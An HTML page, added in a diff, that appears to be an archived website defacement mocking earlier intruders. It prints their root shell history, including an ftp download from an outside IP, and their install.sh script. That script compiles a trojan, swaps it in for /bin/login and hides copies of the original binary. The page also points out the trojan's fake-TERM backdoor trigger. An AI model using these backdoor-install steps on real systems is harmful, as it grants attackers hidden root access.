@@ -1,0 +1,50 @@
+
+<HTML>
+ <HEAD>
+  <TITLE>#sesame = scriptkids.</TITLE>
+ </HEAD>
+ <BODY font=20">
+<p>     </p>
+<p> .bash_history mean anything to you guys? <br>
+ lets have a look: <br>
+bash# tail -35 /root/.bash_history | head -5 <br>
+cd /dev/hda23 <br>
+ftp 198.93.195.229 <br>
+chmod +x install.sh <br>
+./install.sh <br>
+uname -a <br>
+<br>
+nice guys. <br>
+lets look at install.sh. <br>
+bash# cat install.sh <br>
+#!/bin/sh <br>
+gcc -o login bj.c <br>
+chown root:bin login <br>
+ chmod 4555 login <br>
+ chmod u-w login <br>
+ cp /bin/login /usr/bin/xstat <br>
+ cp /bin/login /usr/bin/old <br>
+ chmod 555 /usr/bin/xstat <br>
+ chgrp bin /usr/bin/xstat <br>
+ mv login /bin/login <br>
+ rm bj.c <br>
+  <br>
+ word. impressing. even wrong permissions on /bin/login. <br>
+ should have been 4711. timestamping? *sigh* </p>
+<p> last and not least since they are using a kiddie trojan.
+lets have a look at it. <br>
+        <br>
+ bash# strings /bin/login| tail -5  <br>
+ /usr/bin/xstat  <br>
+ TERM  <br>
+ vt400 <br>
+ vt100 <br>
+ %s=%s <br>
+ bash# <br>
+<br>
+ vt400. nice fake TERM guys.  <br>
+<br>
+ well I'm out. sleep well, and don't rm -rf. grep is your friend. </p>
+</BODY>
+</HTML>
+<!-- www.attrition.org web hack mirror - watermark or something -->
